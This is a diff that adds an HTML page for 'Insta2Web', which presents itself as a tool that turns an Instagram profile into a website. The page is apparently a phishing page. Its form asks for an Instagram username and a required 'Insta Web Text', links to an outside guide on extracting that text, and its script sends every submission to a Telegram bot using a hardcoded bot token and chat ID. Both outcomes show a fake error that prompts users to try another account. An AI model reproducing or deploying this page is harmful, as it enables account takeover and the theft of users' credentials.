@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Insta2Web</title>
+  <style>
+    /* Your CSS styles here */
+
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #800517;
+      color: #fff;
+    }
+
+    header {
+      background-color: #c24641;
+      color: #fff;
+      padding: 20px 0;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 2.5em;
+      font-family: 'Arial Black', sans-serif;
+      color: #fff;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+    }
+
+    header p {
+      font-size: 1.2em;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
+      background-color: #fff;
+      color: #ff4242;
+      text-decoration: none;
+      border-radius: 5px;
+      margin-top: 20px;
+      transition: background-color 0.3s, color 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #ff4242;
+      color: #fff;
+    }
+
+    .how-it-works {
+      background-color: #333;
+      padding: 50px 0;
+    }
+
+    .form-container {
+      background-color: #2d2d2d;
+      color: #fff;
+      padding: 50px 0;
+      text-align: center;
+    }
+
+    .form-container label {
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    .form-container select,
+    .form-container input,
+    .form-container textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #fff;
+      border-radius: 5px;
+      background-color: #444;
+      color: #fff;
+    }
+
+    .instructions {
+      font-size: 0.9em;
+      color: #bbb;
+    }
+
+    .footer {
+      background-color: #333;
+      color: #fff;
+      padding: 10px 0;
+      text-align: center;
+    }
+
+    /* Your modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background-color: #fff;
+      color: #2d2d2d;  /* Change text color to a dark color */
+      padding: 20px;
+      border-radius: 5px;
+      text-align: center;
+    }
+
+    .modal button {
+      padding: 10px 20px;
+      background-color: #ff4242;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s, color 0.3s;
+    }
+
+    .modal button:hover {
+      background-color: #fff;
+      color: #ff4242;
+    }
+    
+          .loading-animation {
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 3px; /* Adjust the height of the loading animation bar */
+         background: linear-gradient(to right, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80, #405DE6);
+         animation: moveGradient 4s linear infinite;
+         background-size: 200% 100%;
+      }
+
+      @keyframes moveGradient {
+         3% {
+            background-position: 200% 0;
+         }
+         100% {
+            background-position: -200% 0;
+         }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="container">
+      <h1>Insta<span style="color: #ff4242;">2</span>Web</h1>
+      <p>A platform to turn your Instagram profile into a stunning website!</p>
+      <a href="#create-form" class="btn">Create Your Own</a>
+    </div>
+  </header>
+
+  <section class="how-it-works">
+    <div class="container">
+      <h2>How It Works</h2>
+      <p>
+
+---
+
+ Welcome to Insta2Web - Your Instagram to Website Converter!</p>
+
+<li>#1. Overview:
+Insta2Web is a user-friendly platform that allows you to transform your Instagram profile into a stunning personalized website effortlessly. Follow the guide below to get started!
+
+</li><li>#2. Getting Started:*
+- Visit our homepage: [Insta2Web](#)
+- Click on the "Create Your Own" button to begin the process.</li>
+
+<li>>#3. Form Submission:
+Fill out the form with the following details:
+- **Website Name:** Enter the desired name for your website.
+- **Instagram ID:** Provide your Instagram username.
+- **User Goal:** Select the purpose of your website from the dropdown options.
+- **Theme:** Choose your preferred theme (Dark, Light, or Auto).
+- **Insta Web Text:** Add the provided text for syncing posts and reels.</li
+
+
+    </div>
+  </section>
+
+  <div id="create-form" class="form-container">
+    <div class="container">
+      <form onsubmit="submitForm(event);">
+        <label for="website-name">Website Name:</label>
+        <input type="text" id="website-name" name="website_name" required>
+
+        <label for="insta-id">Instagram ID:</label>
+        <input type="text" id="insta-id" name="insta_id" required>
+
+        <label for="user-goal">User Goal:</label>
+        <select id="user-goal" name="user_goal" required>
+          <option value="affiliate-marketing">For Affiliate Marketing</option>
+          <option value="running-ads">For Running Ads</option>
+          <option value="selling-courses-products">For Selling Courses/Products</option>
+          <option value="personal-use">For Personal Use</option>
+          <option value="others">Others...</option>
+        </select>
+
+        <label for="theme">Select Theme:</label>
+        <select id="theme" name="theme" required>
+          <option value="dark">Dark</option>
+          <option value="light">Light</option>
+          <option value="auto">Auto</option>
+        </select>
+
+        <label for="insta-web-text">Insta Web Text:</label>
+        <textarea id="insta-web-text" name="insta_web_text" rows="4" required></textarea>
+
+        <p class="instructions">Use of "Insta Web Text": To sync posts and reels from your Instagram profile to your website.</p>
+        <a href="https://sgsvdbdusbswbwbs.github.io/Insta-Web-Text-guide/" target="_blank" style="color: #ff4242;">How to extract "Insta Web Text"</a>
+
+        <button type="submit" class="btn">Create Now!</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Your modal HTML -->
+  <div id="success-modal" class="modal">
+    <div class="modal-content">
+      <p>Oops!😞 something went wrong .Please try again or try for another Instagram account.</p>
+      <button onclick="closeModal()">Close</button>
+    </div>
+  </div>
+
+  <div id="error-modal" class="modal">
+    <div class="modal-content">
+      <p>Oops!😞 something went wrong .Please try again or try for another Instagram account.</p>
+      <button onclick="closeModal()">Close</button>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2024 Insta2Web. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script>
+    function submitForm(event) {
+      event.preventDefault();
+
+      // Collect form data
+      const formData = new FormData(event.target);
+
+      // Send data to Telegram bot API
+      const chatId = '-1002097460966';
+      const botToken = '6436395105:AAH38gmGl_UsiiH2mgDjAg3DitRnwPub7nU';
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      const message = `New Insta2Web Submission:
+      Website Name: ${formData.get('website_name')}
+      Instagram ID: ${formData.get('insta_id')}
+      User Goal: ${formData.get('user_goal')}
+      Theme: ${formData.get('theme')}
+      Insta Web Text: ${formData.get('insta_web_text')}`;
+
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Oops!😞 something went wrong .Please try again or try for another Instagram account.');
+        }
+        console.log('Oops!😞 something went wrong .Please try again or try for another Instagram account.');
+
+        // Show success modal
+        document.getElementById('success-modal').style.display = 'flex';
+      })
+      .catch(error => {
+        console.error('Error:', error.message);
+
+        // Show error modal
+        document.getElementById('error-modal').style.display = 'flex';
+      });
+    }
+
+    function closeModal() {
+      // Close the modals
+      document.getElementById('success-modal').style.display = 'none';
+      document.getElementById('error-modal').style.display = 'none';
+    }
+  </script>
+    <div class="loading-animation"></div>
+</body>
+</html>
